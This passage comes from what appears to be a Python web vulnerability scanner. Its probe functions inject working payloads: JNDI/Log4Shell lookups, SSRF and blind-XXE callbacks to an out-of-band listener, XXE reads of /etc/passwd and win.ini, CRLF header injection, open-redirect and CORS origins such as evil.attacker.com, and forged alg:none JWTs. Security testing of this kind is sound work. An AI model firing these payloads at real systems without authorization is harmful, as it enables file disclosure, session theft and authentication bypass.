        params = pt.get("params") or {}
        if not params:
            continue
        ep = await collab.new_raw_endpoint()
        if not ep:
            continue
        token, host = ep
        pls = _jndi_payloads(host)
        tp = {k: pls[i % len(pls)] for i, k in enumerate(params)}
        try:
            if pt.get("method") == "POST":
                await _post(session, pt["url"], data=tp)
            else:
                await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
        except ScanInterrupted:
            raise
        except Exception:
            pass
        _units.append((token, "param", pt.get("url", "")))
        _n += 1

    if not _units:
        return None
    # JVM 콜백 대기(LDAP 연결까지 시간 소요 가능)
    for _ in range(6):
        if any(collab.was_hit(t) for t, _k, _d in _units):
            break
        await asyncio.sleep(1)
    hit = [(t, k, d) for t, k, d in _units if collab.was_hit(t)]
    if not hit:
        return None
    t0, kind0, detail0 = hit[0]
    where = "HTTP 헤더" if kind0 == "header" else f"파라미터({detail0})"
    return {
        "type": "jndi_injection", "confirmed": True, "oob_hit": True,
        "confidence": "CONFIRMED", "vector": kind0, "url": base_url,
        "affected_endpoints": [detail0 or base_url],
        "evidence": (
            f"JNDI/Log4Shell 실증: {where}에 JNDI 룩업 주입 → 서버(JVM)가 스캐너 raw-TCP 캐처로 "
            f"LDAP 연결(토큰 {t0[:8]}…) 도달. 셸/데이터 추출 없이 서버측 코드 실행 경로(원격 클래스 "
            f"로딩)를 확증 — Log4Shell 계열 원격 코드 실행 취약."
        ),
    }


_SSRF_INTERNAL_RE = re.compile(
    r"(127\.0\.0\.1|localhost|169\.254\.169\.254|"
    r"metadata\.google|internal|private|intranet|0\.0\.0\.0)",
    re.IGNORECASE,
)


async def _probe_ssrf(session, base_url: str, points: list[dict], scan_id: str = "") -> dict | None:
    """SSRF(OOB 확증): url/host/webhook/callback 류 파라미터에 유니크 콜백 URL 을 주입하고,
    대상 서버가 스캐너 리스너로 요청을 보내오면(콜백 히트) 실증한다. 콜백 없으면 미확정(오탐 0).
    ENABLE_OOB=false 이면 컬래보레이터가 없어 아무 것도 하지 않는다(예전 동작 유지)."""
    try:
        import oob_collaborator as _oob
    except Exception:
        return None
    collab = _oob.get_collaborator(scan_id)
    if collab is None:
        return None   # OOB 비활성 — 본문 매칭 방식은 오탐률이 높아 수행하지 않음
    token_map: dict = {}
    tested = 0
    for pt in points:
        if tested >= 20:
            break
        for param in list(pt.get("params") or {}):
            if param.lower() not in _SSRF_PARAMS:
                continue
            token = collab.new_token()
            payload = collab.url_for(token)
            tp = {**pt["params"], param: payload}
            token_map[token] = (pt.get("url", ""), param, pt.get("method", "GET"))
            try:
                if pt.get("method") == "POST":
                    await _post(session, pt["url"], data=tp)
                else:
                    await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
            except ScanInterrupted:
                raise
            except Exception:
                pass
            tested += 1
            if tested >= 20:
                break
    if not token_map:
        return None
    # 대상이 콜백 URL 을 fetch 할 시간을 준다(최대 ~6초, 히트 즉시 종료).
    for _ in range(6):
        if any(collab.was_hit(t) for t in token_map):
            break
        await asyncio.sleep(1)
    hits = [(t, token_map[t]) for t in token_map if collab.was_hit(t)]
    if not hits:
        return None
    t0, (url0, param0, method0) = hits[0]
    return {
        "type": "oob_ssrf", "confirmed": True, "oob_hit": True,
        "url": url0, "param": param0, "method": method0,
        "evidence": (f"SSRF 실증(OOB 콜백): 파라미터 '{param0}' 에 스캐너 콜백 URL 주입 → "
                     f"대상 서버가 스캐너 리스너로 요청 도달(토큰 {t0[:8]}…). "
                     f"서버측 요청 위조 확인(오탐 없음)."),
        "affected_endpoints": [url0],
    }


# ── XXE: XML 외부 엔티티 인젝션 ───────────────────────────────────────────────

_XXE_PAYLOADS = [
    b'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/passwd">]><t>&x;</t>',
    b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    b'<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
    # Windows 대상(win.ini) — Unix 파일이 없거나 Windows 서버일 때 실증
    b'<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><t>&x;</t>',
]
_XXE_UNIX = re.compile(_ETC_PASSWD_PAT)   # LFI 와 동일한 /etc/passwd 시그니처 공유
_XXE_WIN = re.compile(r"\[(extensions|fonts|mci extensions|files)\]", re.IGNORECASE)


async def _probe_xxe(session, base_url: str, points: list[dict] | None = None,
                     scan_id: str = "") -> dict | None:
    """XXE: XML 요청에서 /etc/passwd(Unix) 또는 win.ini(Windows) 내용 로드 여부 확인.
    고정 경로 추측뿐 아니라 발견된 입력점(points)의 엔드포인트도 대상에 포함(discovery-driven).
    OOB 컬래보레이터(ENABLE_OOB) 활성 시 blind XXE(외부 엔티티 콜백)도 확증한다."""
    xml_paths = ["/api", "/api/v1", "/api/v2", "/upload", "/import",
                 "/process", "/parse", "/data", "/service", "/ws", "/soap", "/xml"]
    targets: list[str] = [base_url.rstrip("/") + p for p in xml_paths]
    # 크롤/폼에서 발견한 엔드포인트(특히 API/POST) 도 XML 수용 가능 → 대상에 추가.
    _seen_t = set(targets)
    for pt in (points or []):
        u = (pt.get("url") or "").split("?")[0]
        if not u or u in _seen_t:
            continue
        # 정적 자산 제외
        if re.search(r'\.(js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|map|pdf)(\?|$)', u, re.IGNORECASE):
            continue
        _seen_t.add(u)
        targets.append(u)
        if len(targets) >= 30:
            break
    for url in targets:
        for payload in _XXE_PAYLOADS:
            _, body, _ = await _post(session, url, data=payload,
                                     headers={"Content-Type": "application/xml"})
            if not body:
                continue
            mu = _XXE_UNIX.search(body)
            mw = _XXE_WIN.search(body)
            if mu or mw:
                preview = (mu or mw).group(0)[:100]
                target = "/etc/passwd" if mu else "win.ini"
                return {
                    "url": url,
                    "type": "file_read",
                    "confirmed": True,
                    "evidence": f"XXE: {target} 내용 노출 확인 → {preview}",
                }

    # blind XXE(OOB): 외부 엔티티가 스캐너 콜백 URL 을 fetch 하면 확증(응답 본문 무관).
    try:
        import oob_collaborator as _oob
        collab = _oob.get_collaborator(scan_id)
    except Exception:
        collab = None
    if collab is not None:
        _xxe_tokens: dict = {}
        for url in targets[:15]:
            token = collab.new_token()
            cb = collab.url_for(token)
            # 외부 일반 엔티티 + 파라미터 엔티티(완전 블라인드) 두 변형
            for pl in (
                f'<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "{cb}">]><t>&x;</t>',
                f'<?xml version="1.0"?><!DOCTYPE t [<!ENTITY % x SYSTEM "{cb}"> %x;]><t/>',
            ):
                try:
                    await _post(session, url, data=pl.encode(),
                                headers={"Content-Type": "application/xml"})
                except ScanInterrupted:
                    raise
                except Exception:
                    pass
            _xxe_tokens[token] = url
        for _ in range(5):
            if any(collab.was_hit(t) for t in _xxe_tokens):
                break
            await asyncio.sleep(1)
        hit = [(t, _xxe_tokens[t]) for t in _xxe_tokens if collab.was_hit(t)]
        if hit:
            t0, url0 = hit[0]
            return {
                "url": url0, "type": "oob_blind", "confirmed": True, "oob_hit": True,
                "evidence": (f"blind XXE 실증(OOB): 외부 XML 엔티티가 스캐너 콜백으로 요청 도달"
                             f"(토큰 {t0[:8]}…) — 응답 본문 없이도 외부 엔티티 처리 확인."),
                "affected_endpoints": [url0],
            }
    return None


# ── DS: 안전하지 않은 역직렬화(Insecure Deserialization) — 탐지 전용(SAFE) ─────────
async def _probe_deserialization(session, base_url: str, points: list[dict],
                                 cookies: list[dict] | None = None) -> dict | None:
    """직렬화 객체가 쿠키/파라미터/본문/ViewState 에 노출되는지 '탐지'한다(익스플로잇 없음).

    Java(rO0/aced0005)·PHP(O:..)·.NET(__VIEWSTATE)·Ruby(Marshal)·Python(pickle) 서명 매칭.
    존재만으로 취약은 아니므로 '참고(attack_surface)'로 보고(CWE-502).
    """
    import deep_detect as _dd

    sources: dict = {}
    try:
        _, body, hdrs = await _get(session, base_url)
        if body:
            sources["response_body"] = body[:20000]
        sc = ""
        if isinstance(hdrs, dict):
            sc = hdrs.get("Set-Cookie", "") or hdrs.get("set-cookie", "")
        if sc:
            sources["set_cookie"] = sc
    except Exception:
        pass
    for c in (cookies or []):
        try:
            val = c.get("value") if isinstance(c, dict) else str(c)
            if val:
                sources.setdefault("cookies", "")
                sources["cookies"] += " " + str(val)
        except Exception:
            continue
    _pv = []
    for pt in (points or [])[:20]:
        for v in (pt.get("params") or {}).values():
            if isinstance(v, str) and v:
                _pv.append(v)
    if _pv:
        sources["param_values"] = " ".join(_pv)[:20000]

    hits = _dd.scan_sources_for_serialized(sources)
    if not hits:
        return None
    first = hits[0]
    return {
        "url": base_url,
        "type": "insecure_deserialization_surface",
        "confirmed": False,   # 표면 탐지(참고) — 실증 아님
        "locations": hits,
        "evidence": (f"직렬화 객체 노출 감지: {first['format']} @ {first['location']} "
                     f"(샘플: {first['sample']}). 서버가 이를 신뢰 역직렬화하면 원격코드실행 위험(CWE-502)."),
    }


# ── OR: 오픈 리다이렉트 ────────────────────────────────────────────────────────

_REDIRECT_PARAMS = {
    "redirect", "url", "next", "return", "returnurl", "redirect_to",
    "goto", "target", "dest", "destination", "redir", "ref",
    "continue", "back", "forward", "location", "link", "path",
}
_REDIRECT_PROBE = "https://evil.scanner-probe.example.com"
_REDIRECT_SENTINEL_HOST = "evil.scanner-probe.example.com"


def _redirect_lands_on_sentinel(loc: str, request_url: str) -> bool:
    """Location 이 '실제로' 외부 센티넬 도메인으로 이동하는지 판정(오탐 차단 핵심).

    부분 문자열 매칭이 아니라 **목적지 host** 가 센티넬(또는 그 서브도메인)일 때만 True.
    - 상대/프로토콜상대(//host) Location 은 요청 URL 기준으로 절대화해 최종 host 로 판정.
    - same-site 리다이렉트의 쿼리에 값만 반사된 경우(예: Location: https://target/login?next=<센티넬>)
      → 최종 host 는 target 이므로 False (실제로는 안전 → 오탐 아님).
    - '의도한 페이지로 가면서 URL 만 바뀌는' 정상 리다이렉트도 host 가 센티넬이 아니므로 False.
    """
    if not loc:
        return False
    try:
        abs_loc = urllib.parse.urljoin(request_url or "", loc.strip())
        host = (urllib.parse.urlparse(abs_loc).hostname or "").lower()
    except Exception:
        return False
    return host == _REDIRECT_SENTINEL_HOST or host.endswith("." + _REDIRECT_SENTINEL_HOST)


async def _probe_open_redirect(session, base_url: str, points: list[dict], scan_id: str = "",
                               discovered_urls: list[str] | None = None) -> dict | None:
    """오픈 리다이렉트: 임의 외부 URL로 리다이렉트 가능한지 확인.

    발견(discovery) 강건화: 파라미터-포인트뿐 아니라 이미 리다이렉트류 쿼리 파라미터를
    달고 있는 '발견된 URL'(예: DVWA `.../source/low.php?redirect=info.php`)도 직접 테스트한다.
    크롤러가 해당 링크를 URL로만 수집하고 파라미터-포인트로 승격하지 못한 경우의 미탐을 막는다.
    """
    def _hdr_loc(headers: dict) -> str:
        # 서버가 소문자 'location' 으로 보낼 수 있어 대소문자 무시로 조회.
        for k, v in (headers or {}).items():
            if k.lower() == "location":
                return v
        return ""

    # 인증 크롤 전체 페이지도 발견 URL 에 합류(라운드 교체로 누락된 open_redirect/ 등 리다이렉트 랜딩 보정)
    discovered_urls = list(discovered_urls or []) + get_auth_urls(scan_id)

    encoded = urllib.parse.quote(_REDIRECT_PROBE)
    for param in _REDIRECT_PARAMS:
        attack_url = f"{base_url}?{param}={encoded}"
        _, _, headers = await _get(session, attack_url)
        loc = _hdr_loc(headers)
        if _redirect_lands_on_sentinel(loc, attack_url):
            shots = await _capture_step_shots(scan_id, [
                (base_url,
                 f"【1단계】 점검 대상 URL 정상 접속\nURL: {base_url[:100]}",
                 "#1E3A5F", "left"),
                (attack_url,
                 f"【2단계】 리다이렉트 파라미터에 외부 URL 삽입\n"
                 f"파라미터: {param}={_REDIRECT_PROBE}",
                 "#B45309", "left"),
                (base_url,
                 f"【3단계】 ★ 오픈 리다이렉트 취약점 확인됨\n"
                 f"HTTP Location 헤더: {loc[:100]}\n"
                 "→ 피싱 사이트로 사용자를 유도할 수 있음",
                 "#DC2626", "center"),
            ], f"redir_{param[:8]}") if scan_id else []
            return {
                "param": param,
                "url": attack_url,
                "redirect_to": loc,
                "confirmed": True,
                "evidence_screenshots": shots,
                "evidence": f"오픈 리다이렉트: {param}={_REDIRECT_PROBE} → Location: {loc}",
            }
    for pt in points[:24]:
        for param in list(pt["params"]):
            if param.lower() not in _REDIRECT_PARAMS:
                continue
            tp = {**pt["params"], param: _REDIRECT_PROBE}
            if pt["method"] == "POST":
                _, _, headers = await _post(session, pt["url"], data=tp)
            else:
                _, _, headers = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
            loc = _hdr_loc(headers)
            if _redirect_lands_on_sentinel(loc, pt["url"]):
                return {
                    "param": param,
                    "url": pt["url"],
                    "redirect_to": loc,
                    "confirmed": True,
                    "evidence": f"오픈 리다이렉트: {param}={_REDIRECT_PROBE} → Location: {loc}",
                }

    # 발견된 URL 스윕: 이미 리다이렉트류 쿼리 파라미터를 달고 있는 URL을 직접 테스트한다.
    # (크롤러가 파라미터-포인트로 승격 못한 링크의 미탐 방지 — 예: DVWA source/low.php?redirect=)
    seen: set[str] = set()
    for raw in (discovered_urls or [])[:120]:
        try:
            pr = urllib.parse.urlparse(raw)
            q = urllib.parse.parse_qs(pr.query)
        except Exception:
            continue
        red_params = [k for k in q if k.lower() in _REDIRECT_PARAMS]
        if not red_params:
            continue
        base_path = pr._replace(query="", fragment="").geturl()
        for param in red_params:
            key = base_path + "|" + param
            if key in seen:
                continue
            seen.add(key)
            newq = {k: (v[0] if isinstance(v, list) else v) for k, v in q.items()}
            newq[param] = _REDIRECT_PROBE
            test_url = base_path + "?" + urllib.parse.urlencode(newq)
            _, _, headers = await _get(session, test_url)
            loc = _hdr_loc(headers)
            if _redirect_lands_on_sentinel(loc, test_url):
                return {
                    "param": param,
                    "url": base_path,
                    "redirect_to": loc,
                    "confirmed": True,
                    "evidence": f"오픈 리다이렉트: {param}={_REDIRECT_PROBE} → Location: {loc}",
                }

    # 랜딩 페이지 하위 링크 추적: 리다이렉트 키워드 경로(예: /open_redirect/)만 도달하고 실제
    # 취약 엔드포인트(예: source/low.php?redirect=)는 크롤러가 못 따라간 경우 → 랜딩을 GET 해
    # redirect 류 파라미터를 단 하위 링크를 추출·테스트한다(발견 깊이 보강).
    _land_re = re.compile(r'(open[_-]?redirect|redirect|redir|/go/|/out/|/link/)', re.IGNORECASE)
    _redir_qs = "|".join(re.escape(p) for p in _REDIRECT_PARAMS)
    _href_re = re.compile(r'(?:href|src|action)\s*=\s*["\']([^"\']*(?:' + _redir_qs + r')=[^"\']*)["\']',
                          re.IGNORECASE)
    _landings = []
    for raw in (discovered_urls or [])[:120]:
        _r = raw if isinstance(raw, str) else raw.get("url", "")
        if _r and _land_re.search(urllib.parse.urlparse(_r).path):
            _landings.append(_r)
    for land in list(dict.fromkeys(_landings))[:6]:
        try:
            _, body, _ = await _get(session, land)
        except Exception:
            continue
        if not body:
            continue
        for href in _href_re.findall(body)[:8]:
            sub = urllib.parse.urljoin(land, href.strip())
            try:
                spr = urllib.parse.urlparse(sub)
                sq = urllib.parse.parse_qs(spr.query)
            except Exception:
                continue
            rps = [k for k in sq if k.lower() in _REDIRECT_PARAMS]
            if not rps:
                continue
            sbase = spr._replace(query="", fragment="").geturl()
            for param in rps:
                key = sbase + "|" + param
                if key in seen:
                    continue
                seen.add(key)
                nq = {k: (v[0] if isinstance(v, list) else v) for k, v in sq.items()}
                nq[param] = _REDIRECT_PROBE
                turl = sbase + "?" + urllib.parse.urlencode(nq)
                _, _, headers = await _get(session, turl)
                loc = _hdr_loc(headers)
                if _redirect_lands_on_sentinel(loc, turl):
                    return {
                        "param": param,
                        "url": sbase,
                        "redirect_to": loc,
                        "confirmed": True,
                        "evidence": f"오픈 리다이렉트: {param}={_REDIRECT_PROBE} → Location: {loc}",
                    }
    return None


# ── CORS: 설정 미흡 ────────────────────────────────────────────────────────────

async def _probe_cors(session, base_url: str, scan_id: str = "") -> dict | None:
    """
    CORS 등급 체계 (4단계):
      INFO     — wildcard(*) 단독: 공개 API에서 의도적일 수 있음, 자격증명 미포함
      LOW      — Origin 반사만: 공격자 도메인이 ACAO에 그대로 반영, 자격증명 없음
      MEDIUM   — 반사 + Allow-Credentials: true: 쿠키 포함 요청 가능 → 세션 탈취 가능성
      HIGH     — 반사 + Credentials + 인증 필요 URL 확인: 실제 인증 컨텍스트에서 익스플로잇 가능
    CONFIRMED 조건: 반사 + Credentials 조합만으로도 CONFIRMED (헤더가 실증 증거)
    wildcard 단독은 POSSIBLE (공개 API 의도적 설정 가능성)
    """
    parsed = urllib.parse.urlparse(base_url)
    test_origins = [
        "https://evil.attacker.com",
        f"https://evil.{parsed.netloc}",
        "null",
    ]

    # 1단계: wildcard 확인
    _, _, base_headers = await _get(session, base_url, headers={"Origin": "https://probe.check"})
    acao_base = base_headers.get("Access-Control-Allow-Origin", "")
    if acao_base == "*":
        acac_base = base_headers.get("Access-Control-Allow-Credentials", "").lower()
        # wildcard + credentials는 브라우저가 차단하지만 설정 미흡 자체를 INFO로 기록
        return {
            "type": "wildcard",
            "allow_origin": "*",
            "allow_credentials": acac_base,
            "cors_level": "INFO",
            "confirmed": False,
            "evidence": (
                "CORS 와일드카드 설정: Access-Control-Allow-Origin: * — "
                "공개 리소스 의도적 설정 가능. 인증 API에 적용 시 재확인 필요."
            ),
        }

    # 2단계: Origin 반사 확인
    for origin in test_origins:
        _, _, headers = await _get(session, base_url, headers={"Origin": origin})
        acao = headers.get("Access-Control-Allow-Origin", "")
        acac = headers.get("Access-Control-Allow-Credentials", "").lower()

        if not acao:
            continue

        # null + credentials
        if acao == "null" and acac == "true" and origin == "null":
            shots = await _capture_step_shots(scan_id, [
                (base_url, f"【1단계】 점검 대상 URL 정상 접속\nURL: {base_url[:100]}", "#1E3A5F", "left"),
                (base_url, "【2단계】 null 오리진으로 CORS 요청 전송\nOrigin: null", "#B45309", "left"),
                (base_url,
                 "【3단계】 ★ CORS 취약점 확인됨 [MEDIUM]\n"
                 "null 오리진 반사 + Allow-Credentials: true\n"
                 "→ Sandbox iframe 공격으로 세션 탈취 가능",
                 "#DC2626", "center"),
            ], "cors")
            return {
                "type": "null_origin_with_credentials",
                "tested_origin": "null",
                "allow_origin": acao,
                "allow_credentials": acac,
                "cors_level": "MEDIUM",
                "confirmed": True,
                "evidence_screenshots": shots,
                "evidence": "CORS null 오리진 반사 + Allow-Credentials: true — Sandbox iframe 세션 탈취 가능",
            }

        if acao != origin or origin == "null":
            continue

        # Origin 반사 확인됨
        has_credentials = acac == "true"

        if not has_credentials:
            # LOW: 반사만, 자격증명 없음
            shots = await _capture_step_shots(scan_id, [
                (base_url, f"【1단계】 점검 대상 URL 정상 접속\nURL: {base_url[:100]}", "#1E3A5F", "left"),
                (base_url, f"【2단계】 임의 오리진으로 CORS 요청 전송\nOrigin: {origin}", "#B45309", "left"),
                (base_url,
                 f"【3단계】 CORS Origin 반사 확인됨 [LOW]\n"
                 f"Access-Control-Allow-Origin: {acao}\n"
                 f"→ 자격증명 없는 공개 데이터 접근 가능",
                 "#B45309", "center"),
            ], "cors")
            return {
                "type": "reflected",
                "tested_origin": origin,
                "allow_origin": acao,
                "allow_credentials": acac,
                "cors_level": "LOW",
                "confirmed": True,
                "evidence_screenshots": shots,
                "evidence": (
                    f"CORS Origin 반사 [LOW]: Origin: {origin} → ACAO: {acao} "
                    "(자격증명 없음 — 쿠키 미포함 공개 데이터만 노출)"
                ),
            }

        # MEDIUM: 반사 + Credentials
        # HIGH 판단: 인증이 필요한 API 경로에서도 동일하게 반사되는지 확인
        cors_level = "MEDIUM"
        auth_api_url = None
        for api_path in ["/api/me", "/api/user", "/api/profile", "/api/account", "/api/v1/me"]:
            test_url = f"{parsed.scheme}://{parsed.netloc}{api_path}"
            api_status, _, api_hdrs = await _get(session, test_url, headers={"Origin": origin})
            api_acao = api_hdrs.get("Access-Control-Allow-Origin", "")
            api_acac = api_hdrs.get("Access-Control-Allow-Credentials", "").lower()
            if api_status not in (401, 404, 400) and api_acao == origin and api_acac == "true":
                cors_level = "HIGH"
                auth_api_url = test_url
                break

        shots = await _capture_step_shots(scan_id, [
            (base_url, f"【1단계】 점검 대상 URL 정상 접속\nURL: {base_url[:100]}", "#1E3A5F", "left"),
            (base_url,
             f"【2단계】 임의 오리진으로 CORS 요청 전송\nOrigin: {origin}\n"
             f"→ 서버가 자격증명 포함 요청을 허용하는지 확인",
             "#B45309", "left"),
            (base_url,
             f"【3단계】 ★ CORS 취약점 확인됨 [{cors_level}]\n"
             f"Access-Control-Allow-Origin: {acao}\n"
             f"Access-Control-Allow-Credentials: {acac}\n"
             + (f"→ 인증 API({api_path}) 에서도 동일하게 반사됨" if auth_api_url else
                "→ 자격증명 포함 크로스도메인 요청으로 세션 탈취 가능"),
             "#DC2626", "center"),
        ], "cors")

        evidence_msg = (
            f"CORS 취약점 [{cors_level}]: Origin: {origin} → ACAO: {acao}, "
            f"Allow-Credentials: true"
        )
        if auth_api_url:
            evidence_msg += f" / 인증 API {auth_api_url}에서도 반사 확인"

        return {
            "type": "reflected_with_credentials",
            "tested_origin": origin,
            "allow_origin": acao,
            "allow_credentials": acac,
            "cors_level": cors_level,
            "auth_api_url": auth_api_url,
            "confirmed": True,
            "evidence_screenshots": shots,
            "evidence": evidence_msg,
        }

    return None


# ── CRLF: HTTP 헤더 인젝션 ────────────────────────────────────────────────────

_CRLF_INJECT_HEADER = "X-Scanner-Injected"
_CRLF_PAYLOADS = [
    f"%0d%0a{_CRLF_INJECT_HEADER}:injected",
    f"%0a{_CRLF_INJECT_HEADER}:injected",
    f"\r\n{_CRLF_INJECT_HEADER}:injected",
    f"%0d%0a%20{_CRLF_INJECT_HEADER}:injected",
]


async def _probe_crlf(session, base_url: str, points: list[dict]) -> dict | None:
    """CRLF 인젝션: 응답 헤더에 임의 헤더 삽입 가능한지 확인."""
    inject_re = re.compile(_CRLF_INJECT_HEADER, re.IGNORECASE)
    for pt in points[:_sqli_cap(8)]:
        for param in list(pt["params"])[:6]:
            for payload in _CRLF_PAYLOADS[:3]:
                tp = {**pt["params"], param: f"test{payload}"}
                _, _, headers = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
                if any(inject_re.match(k) for k in headers):
                    return {
                        "param": param,
                        "payload": payload,
                        "url": pt["url"],
                        "injected_header": _CRLF_INJECT_HEADER,
                        "confirmed": True,
                        "evidence": f"CRLF 인젝션: 응답 헤더에 '{_CRLF_INJECT_HEADER}' 삽입 확인",
                    }
    return None


# ── JWT: 토큰 취약점 분석 ─────────────────────────────────────────────────────

_JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')


def _probe_jwt_from_cookies(cookies: list[dict]) -> dict | None:
    for cookie in cookies:
        raw = cookie.get("raw", "")
        kv = raw.split(";")[0]
        value = kv.split("=", 1)[1].strip() if "=" in kv else ""
        jwt_m = _JWT_RE.search(value)
        if not jwt_m:
            continue
        token = jwt_m.group(0)
        parts = token.split(".")
        if len(parts) != 3:
            continue
        try:
            def _decode(s):
                s += "=" * (-len(s) % 4)      # base64 패딩(정확히 필요한 만큼) — 기존 "=="*n 은 과패딩 버그
                return _json.loads(base64.urlsafe_b64decode(s))
            header  = _decode(parts[0])
            payload = _decode(parts[1])
        except Exception:
            continue

        alg = header.get("alg", "")
        issues = []

        # HS256 은 표준 정상 알고리즘 — 그 자체로는 취약이 아니므로 확정 이슈에서 제외(오탐 방지).
        # 실제 서명 검증 우회는 별도 프로브(_probe_jwt_alg_none_forgery / _probe_jwt_alg_confusion)가 능동 실증한다.
        if alg.lower() in ("none", ""):
            issues.append("alg:none — 서명 없이 토큰 위조 가능 (JWT 최고 위험)")
        sensitive = [k for k in payload if k.lower() in ("password", "secret", "key", "hash", "pw")]
        for k in sensitive:
            issues.append(f"JWT 페이로드 내 민감 필드 노출: '{k}'")

        if issues:
            return {
                "cookie_name": cookie.get("name", "unknown"),
                "algorithm": alg,
                "issues": issues,
                "header": header,
                "payload_preview": {k: v for k, v in list(payload.items())[:6] if k != "password"},
                "token_preview": token[:60] + "...",
                "confirmed": True,
                "evidence": f"JWT 취약점: {'; '.join(issues[:2])}",
            }
    return None


# ── JWT alg:none 위조·수락 능동 실증(서명 검증 우회) ────────────────────────────────
# 수동 분석(_probe_jwt_from_cookies)은 'alg 가 약할 수 있다'까지만 본다. 여기서는 실제로
# alg:none 토큰을 위조해 재전송하고, 서버가 '유효 토큰처럼' 수락하는지(=서명 검증 우회)를
# 차등 비교로 실증한다. 비파괴 — 읽기 요청 재전송만(상태 변경 없음), 본인 세션 토큰 기반.
_JWT_NONE_HEADERS = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"},
                     {"alg": "NONE", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]


def _jwt_b64url(obj) -> str:
    raw = _json.dumps(obj, separators=(",", ":")).encode() if isinstance(obj, dict) else obj
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _forge_jwt_alg_none(token: str) -> list[str]:
    """원본 JWT 의 payload 를 유지한 채 alg:none·빈 서명으로 위조한 변형들 반환."""
    parts = token.split(".")
    if len(parts) < 2 or not parts[1]:
        return []
    payload_b64 = parts[1]
    return [f"{_jwt_b64url(h)}.{payload_b64}." for h in _JWT_NONE_HEADERS]


def _jwt_bad_sig(token: str) -> str:
    """동일 payload·유효한 alg(HS256)·잘못된 서명 — '거부 기준선'(대조군) 토큰."""
    parts = token.split(".")
    payload_b64 = parts[1] if len(parts) >= 2 else _jwt_b64url({"sub": "x"})
    return f"{_jwt_b64url({'alg': 'HS256', 'typ': 'JWT'})}.{payload_b64}.aW52YWxpZF9zaWc"


def _jwt_candidates_from_cookies(cookies: list[dict]) -> list[tuple]:
    """쿠키에서 (쿠키명, JWT) 후보 추출."""
    out = []
    for c in (cookies or []):
        raw = c.get("raw", "") or ""
        kv = raw.split(";")[0]
        if "=" in kv:
            name, val = kv.split("=", 1)
            name, val = name.strip(), val.strip()
        else:
            name, val = c.get("name", ""), (c.get("value") or "")
        m = _JWT_RE.search(val or "")
        if name and m:
            out.append((name, m.group(0)))
    return out


async def _jwt_confirm_forgery(base_url: str, cname: str, valid_token: str,
                               forged_tokens: list, points: list[dict] | None) -> dict | None:
    """유효/잘못된서명/위조 토큰 3-way 차등으로 '위조 수락'을 확증. 확증 시 판정 근거 dict, else None.
    판정: 유효=인증기준선, 잘못된서명(동일 payload·HS256)=거부 대조군, 위조=유효와 동일·거부와 상이."""
    targets = [base_url] + [p.get("url") for p in (points or [])
                            if p.get("method", "GET") == "GET" and p.get("url")][:6]
    bad = _jwt_bad_sig(valid_token)
    timeout = aiohttp.ClientTimeout(total=8)

    def _like(a, b, ta, tb):
        return ta == tb and abs(len(a) - len(b)) <= max(48, int(0.10 * len(b)) + 1)

    def _unlike(a, b, ta, tb):
        return ta != tb or abs(len(a) - len(b)) > 48

    try:
        async with aiohttp.ClientSession(connector=_ssl_connector(), timeout=timeout) as s2:
            async def fetch(url, tok):
                # _get 경유 → rate 거버너 적용(커스텀 Cookie 헤더라 S4 캐시는 자동 우회)
                _st, _bd, _ = await _get(s2, url, headers={"Cookie": f"{cname}={tok}"})
                return _st, _bd
            for url in targets:
                if not _url_in_scope(url, base_url):
                    continue
                sv, bv = await fetch(url, valid_token)   # 유효 토큰(인증 기준선)
                if sv == 0:
                    continue
                sn, bn = await fetch(url, bad)           # 잘못된 서명(거부 기준선)
                if not _unlike(bv, bn, sv, sn):          # 서버가 인증상태 구분해야 판정 가능
                    continue
                for forged in forged_tokens:
                    sf, bf = await fetch(url, forged)
                    if sf == 0:
                        continue
                    if _like(bf, bv, sf, sv) and _unlike(bf, bn, sf, sn):
                        return {"url": url, "status_valid": sv, "status_forged": sf,
                                "status_bad": sn}
    except ScanInterrupted:
        raise
    except Exception:
        return None
    return None


async def _probe_jwt_alg_none_forgery(base_url: str, cookies: list[dict] | None = None,
                                      points: list[dict] | None = None,
                                      scan_id: str = "") -> dict | None:
    """alg:none 위조 토큰을 재전송해 서버가 서명 검증 없이 수락하는지 차등 실증."""
    for cname, token in _jwt_candidates_from_cookies(cookies):
        forged_list = _forge_jwt_alg_none(token)
        if not forged_list:
            continue
        r = await _jwt_confirm_forgery(base_url, cname, token, forged_list, points)
        if r:
            return {
                "type": "jwt_alg_none", "confirmed": True, "url": r["url"],
                "param": cname, "method": "GET", "cwe_hint": "CWE-347",
                "evidence": (f"JWT alg:none 위조 수락: '{r['url']}' 에 서명 없는 위조 토큰"
                             f"(alg:none, payload 유지)을 쿠키 '{cname}' 로 재전송 시 유효 토큰과 동일한 "
                             f"인증 응답(HTTP {r['status_forged']}) — 잘못된 서명 토큰은 거부"
                             f"(HTTP {r['status_bad']})되므로 서명 검증이 우회됨(토큰 임의 위조 가능)."),
                "affected_endpoints": [r["url"]],
            }
    return None


# ── JWT alg confusion(RS256→HS256): 공개키를 HMAC 시크릿으로 오용 ─────────────────────
# 서버가 RS256(비대칭) 공개키로 검증할 때, 순진한 라이브러리는 토큰 헤더의 alg 를 신뢰한다.
# 공격자는 '공개'키를 HMAC 시크릿으로 삼아 HS256 토큰을 위조하고, 서버는 같은 공개키로 HS256
# 검증에 성공한다(=서명 위조). 공개키는 JWKS(/.well-known/jwks.json 등)에서 획득한다.
_JWT_JWKS_PATHS = ["/.well-known/jwks.json", "/jwks.json", "/jwks",
                   "/.well-known/openid-configuration", "/api/jwks.json",
                   "/oauth/jwks", "/api/.well-known/jwks.json"]


